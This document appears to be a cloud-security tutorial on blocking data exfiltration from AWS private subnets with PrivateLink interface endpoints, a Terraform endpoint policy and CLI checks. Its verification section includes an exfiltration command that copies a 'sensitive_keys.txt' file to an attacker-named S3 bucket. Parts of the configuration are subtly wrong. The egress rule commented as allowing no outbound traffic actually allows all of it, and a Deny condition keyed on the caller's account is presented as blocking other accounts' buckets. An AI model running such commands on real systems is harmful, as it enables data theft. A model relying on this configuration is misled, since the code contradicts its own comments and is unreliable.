# AWS PrivateLink: Interface Endpoint Security and Blocking Data Exfiltration

## The Problem: Private Subnet Exfiltration Vectors

A common misconception in cloud security is that placing a workload inside a VPC private subnet with no Route Table entry to an Internet Gateway makes it secure from data leakage. 

If that workload requires access to standard AWS public APIs (such as Amazon S3, SQS, or KMS) to function, engineers typically provision a NAT Gateway. This NAT Gateway provides a route to the public internet, opening up major exfiltration pathways:

```
Unsecure Subnet Exfiltration Pathway:
+-------------------------------------------------------------+
| Private VPC Subnet                                          |
|                                                             |
|  +--------------------+                                     |
|  | Compromised App VM |                                     |
|  +--------------------+                                     |
+-------------------------------------------------------------+
      | (Legitimate AWS SDK calls)   | (Exfiltration payload)
      v                              v
+-------------+              +--------------------------------+
| NAT Gateway |              | Malicious Public S3 Bucket     |
+-------------+              | or External Attacker Server    |
      |                      +--------------------------------+
      v                                      ^
  (Public Internet Route) -------------------|
```

An attacker who gains remote code execution (RCE) on an instance in this private subnet can:
1. Stream sensitive database records out to an external command-and-control (C2) server over standard HTTPS.
2. Use the instance's legitimate AWS credentials to write data directly into an attacker-owned, public Amazon S3 bucket.

Standard VPC Security Groups are stateful firewalls operating at Layers 3 and 4; they cannot differentiate between a legitimate call to your company's S3 bucket and a malicious call to an attacker's public S3 bucket, as both resolve to the same public AWS IP ranges.

---

## The Solution: AWS PrivateLink with Custom VPC Endpoint Policies

AWS PrivateLink replaces public NAT-routed endpoints with VPC Interface Endpoints. An Interface Endpoint places a redundant set of Elastic Network Interfaces (ENIs) directly inside your private subnets, mapping private, non-routable IPs to AWS services. 

By removing the NAT Gateway route and using Interface Endpoints, traffic never touches the public internet. Crucially, we can attach **VPC Endpoint Policies** (IAM Resource Policies) directly to these ENIs to whitelist exactly which AWS accounts, services, or resources are authorized to receive traffic.

```
Secure PrivateLink Architecture with DLP:
+----------------------------------------------------------------+
| Private VPC Subnet (No NAT Route, No IGW Route)                |
|                                                                |
|  +------------------+                   +------------------+   |
|  | Secure App VM    | --(Private IP)--> | S3 Interface ENI |   |
|  +------------------+                   +------------------+   |
+--------------------------------------------------|-------------+
                                                   | Enforces Endpoint Policy
                                                   v
                                          +------------------+
                                          | AWS PrivateLink  |
                                          | Backbone Network |
                                          +------------------+
                                            /              \
         (Allowed: Your S3 Bucket)         /                \ (Blocked: Attacker S3)
                                          v                  v
                            +-------------------+      +-------------------+
                            | prod-data-bucket  |      | attacker-bucket   |
                            | (Company Owned)   |      | (Denied Access)   |
                            +-------------------+      +-------------------+
```

---

## Technical Implementation: Hardened PrivateLink with S3 Interface Endpoint

The following Terraform blueprint deploys an S3 VPC Interface Endpoint, disables the public resolution route, and attaches a granular Data Loss Prevention (DLP) endpoint policy.

```hcl
# privatelink-security/main.tf

provider "aws" {
  region = "us-east-1"
}

variable "vpc_id" {
  type    = string
  default = "vpc-0123456789abcdef0"
}

variable "private_subnet_ids" {
  type    = list(string)
  default = ["subnet-0a1b2c3d4e5f6g7h8", "subnet-0i1j2k3l4m5n6o7p8"]
}

# KMS Key for encrypting endpoints/logs if required
resource "aws_security_group" "s3_endpoint_sg" {
  name        = "s3-private-endpoint-sg"
  description = "Restrict access to S3 Private Interface Endpoint"
  vpc_id      = var.vpc_id

  # Allow inbound HTTPS exclusively from the VPC CIDR block
  ingress {
    description = "HTTPS from internal VPC workloads"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  egress {
    description = "No outbound traffic allowed directly from endpoint ENI"
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# Create S3 Interface Endpoint (Note: Interface endpoint supports granular policies, unlike Gateway)
resource "aws_vpc_endpoint" "s3_interface" {
  vpc_id            = var.vpc_id
  service_name      = "com.amazonaws.us-east-1.s3"
  vpc_endpoint_type = "Interface"

  subnet_ids         = var.private_subnet_ids
  security_group_ids = [aws_security_group.s3_endpoint_sg.id]

  private_dns_enabled = true # Automatically routes s3.us-east-1.amazonaws.com to private ENIs

  # DLP POLICY: Restrict operations strictly to authorized resources
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid       = "AllowReadWriteToSpecificCompanyBucketOnly"
        Effect    = "Allow"
        Principal = "*" # Evaluates all principals traversing this endpoint
        Action = [
          "s3:GetObject",
          "s3:PutObject",
          "s3:ListBucket"
        ]
        Resource = [
          "arn:aws:s3:::corporate-customer-data-prod",
          "arn:aws:s3:::corporate-customer-data-prod/*"
        ]
      },
      {
        Sid       = "BlockAllOtherS3Access"
        Effect    = "Deny"
        Principal = "*"
        Action    = "s3:*"
        Resource  = "*"
        Condition = {
          StringNotEquals = {
            "aws:PrincipalAccount" = ["123456789012"] # Block access to other AWS accounts
          }
        }
      }
    ]
  })
}
```

---

## Verifying and Auditing Policy Enforcement

Once deployed, you can verify traffic restriction directly from a terminal inside the private VM. 

If the application attempts to read from the approved corporate bucket, the request succeeds privately:

```bash
# Executed from private VM
aws s3 cp s3://corporate-customer-data-prod/manifest.json .

# Output:
# download: s3://corporate-customer-data-prod/manifest.json to ./manifest.json
```

If a compromised utility or an attacker attempts to write data to an external, public S3 bucket (e.g., `attacker-controlled-leak`), the PrivateLink endpoint intercepts the transaction at the network layer and blocks it:

```bash
aws s3 cp sensitive_keys.txt s3://attacker-controlled-leak/

# Output:
# upload failed: sensitive_keys.txt to s3://attacker-controlled-leak/sensitive_keys.txt 
# An error occurred (AccessDenied) when calling the PutObject operation: Access Denied.
```

This structural control is absolute; because the VM lacks any routing table entry to a NAT Gateway or Internet Gateway, it is physically impossible for packets to bypass this endpoint policy to reach the internet, establishing a robust defense against exfiltration.
